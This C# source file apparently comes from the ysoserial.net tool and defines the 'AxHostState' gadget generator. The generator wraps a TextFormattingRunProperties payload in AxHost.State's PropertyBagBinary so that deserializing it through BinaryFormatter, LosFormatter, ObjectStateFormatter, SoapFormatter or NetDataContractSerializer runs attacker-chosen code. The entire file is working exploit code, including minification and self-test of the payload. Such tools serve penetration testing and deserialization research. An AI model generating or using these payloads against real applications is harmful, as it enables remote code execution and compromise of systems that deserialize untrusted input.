using System;
using System.Collections.Generic;
using System.Runtime.Serialization;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    class AxHostStateGenerator : GenericGenerator
    {
        public override string Name()
        {
            return "AxHostState";
        }

        public override string Finders()
        {
            return "Soroush Dalili";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.BridgeAndDerived };
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "LosFormatter", "NetDataContractSerializer"};
        }

        [Serializable]
        public class AxHostMarshal : ISerializable
        {
            byte[] _bfPayload;

            public AxHostMarshal(byte[] payload)
            {
                _bfPayload = payload;
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                info.SetType(typeof(System.Windows.Forms.AxHost.State));
                info.AddValue("PropertyBagBinary", _bfPayload);
            }
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {

            Generator generator = new TextFormattingRunPropertiesGenerator();
            byte[] binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
            AxHostMarshal payloadAxHostMarshal = new AxHostMarshal(Convert.FromBase64String(b64encoded));

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
            {
                return Serialize(payloadAxHostMarshal, formatter, inputArgs);
            }
            else if(formatter.Equals("NetDataContractSerializer", StringComparison.OrdinalIgnoreCase))
            {
                InputArgs tempInputArgs = inputArgs.DeepCopy();
                tempInputArgs.Test = false;

                string utfString = System.Text.Encoding.UTF8.GetString((byte[])Serialize(payloadAxHostMarshal, formatter, tempInputArgs));

                string payload = SerializersHelper.NetDataContractSerializer_Marshal_2_MainType(utfString);

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XMLMinifier.Minify(payload, new string[] { "mscorlib", "Microsoft.PowerShell.Editor"}, null, FormatterType.NetDataContractXML, true);
                    }
                    else
                    {
                        payload = XMLMinifier.Minify(payload, null, null, FormatterType.NetDataContractXML, true);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.NetDataContractSerializer_deserialize(payload);
                    }
                    catch(Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                    
                }

                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
